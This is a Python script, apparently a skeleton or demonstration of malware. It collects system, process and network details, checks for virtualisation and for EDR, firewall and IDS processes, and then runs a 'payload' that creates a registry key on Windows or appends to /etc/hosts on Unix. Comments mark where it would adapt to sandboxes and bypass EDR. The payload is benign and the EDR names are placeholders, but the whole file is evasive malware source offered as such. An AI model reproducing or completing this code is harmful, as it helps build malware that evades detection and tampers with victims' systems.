import os
import platform
import psutil
import subprocess
import socket
import json
from datetime import datetime
from multiprocessing import Process

def collect_system_info():
    info = {
        "os": platform.system(),
        "os_version": platform.version(),
        "cpu_count": os.cpu_count(),
        "memory": psutil.virtual_memory().total,
        "hostname": socket.gethostname(),
        "machine_type": platform.machine(),
        "is_virtual": is_virtualized(),
    }
    return info

def collect_process_info():
    processes = []
    for proc in psutil.process_iter(['pid', 'name']):
        processes.append(proc.info)
    return processes

def collect_network_info():
    connections = []
    for conn in psutil.net_connections(kind='inet'):
        connections.append({
            "local_address": conn.laddr,
            "remote_address": conn.raddr,
            "status": conn.status
        })
    return connections

def is_virtualized():
    # Check for hypervisor signatures in system files
    virtualization_signatures = [
        "/sys/class/dmi/id/product_name",
        "/proc/scsi/scsi",
        "/sys/hypervisor/uuid",
        "/sys/class/dmi/id/sys_vendor"
    ]
    for file in virtualization_signatures:
        if os.path.exists(file):
            with open(file, "r") as f:
                content = f.read().lower()
                if any(keyword in content for keyword in ["vmware", "virtualbox", "kvm", "hyper-v", "qemu", "xen"]):
                    return True

    # Additional check using system command for hypervisor
    try:
        output = subprocess.check_output("systemd-detect-virt", shell=True)
        if output.decode().strip() != "none":
            return True
    except subprocess.CalledProcessError:
        pass

    return False

def detect_edr_processes():
    edr_process_names = ['edr_process_name1', 'edr_process_name2']  # Replace with actual EDR process names
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] in edr_process_names:
            return True
    return False

def detect_network_security():
    # Example: Check for common firewall or IDS services
    network_security_tools = ['firewalld', 'ufw', 'snort', 'suricata']
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] in network_security_tools:
            return True
    return False

def collect_all_data():
    data = {}
    data['timestamp'] = datetime.now().isoformat()
    data['system_info'] = collect_system_info()
    data['process_info'] = collect_process_info()
    data['network_info'] = collect_network_info()
    data['edr_present'] = detect_edr_processes()
    data['network_security'] = detect_network_security()
    return data

def save_data_to_file(data, filename='collected_data.json'):
    with open(filename, 'a') as f:
        json.dump(data, f)
        f.write("\n")

def execute_payload():
    # Simple payload example: Writing to a file and modifying system files
    try:
        if platform.system() == "Windows":
            # Windows payload example: Create a registry key
            import winreg as reg
            reg.CreateKey(reg.HKEY_CURRENT_USER, r"Software\MyTestPayload")
            with open("payload_execution.txt", "a") as f:
                f.write(f"Payload executed on Windows at {datetime.now()}\n")
            print("Payload executed on Windows and logged to 'payload_execution.txt'.")
        else:
            # Unix-based payload example: Modify /etc/hosts (requires sudo)
            with open("/etc/hosts", "a") as f:
                f.write(f"# Payload executed at {datetime.now()}\n")
            with open("payload_execution.txt", "a") as f:
                f.write(f"Payload executed on Unix-based system at {datetime.now()}\n")
            print("Payload executed on Unix-based system and logged to 'payload_execution.txt'.")
    except Exception as e:
        print(f"Payload execution failed: {e}")

def adapt_behavior_and_execute_payload(data):
    # Example decision-making logic based on environment data
    if data['system_info']['is_virtual']:
        print("Detected virtual environment. Adapting payload...")
        # Example adaptation: delay execution or modify payload behavior
    if data['edr_present']:
        print("Detected EDR presence. Attempting to bypass...")
        # Example bypass: obfuscate payload or change delivery method

    # Execute the payload after adapting to the environment
    execute_payload()

def run_malware():
    # Run the malware payload in a separate process
    collected_data = collect_all_data()
    save_data_to_file(collected_data)
    adapt_behavior_and_execute_payload(collected_data)

if __name__ == "__main__":
    # Create a new process to run the malware payload
    malware_process = Process(target=run_malware)
    malware_process.start()
    malware_process.join()

    print("Malware process executed.")
